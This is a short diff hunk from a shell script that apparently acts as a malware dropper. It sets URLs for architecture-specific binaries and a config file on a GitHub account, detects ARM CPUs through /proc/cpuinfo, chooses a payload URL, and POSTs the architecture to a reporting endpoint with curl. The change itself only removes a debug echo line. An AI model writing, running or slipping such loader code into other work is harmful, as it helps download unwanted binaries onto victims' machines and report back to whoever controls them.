@@ -6,7 +6,6 @@ intel_url="https://raw.githubusercontent.com/gptloveyou/001/main/i386.bin"
 config_url="https://raw.githubusercontent.com/gptloveyou/001/main/config.json"
 pl_url=$intel_url;
 arch=`cat /proc/cpuinfo|grep -i -c ARM`
-echo $arch
 if [ $arch != 0 ];then
     pl_url=$arm_url
     curl -X POST $report_url -d "ARM"
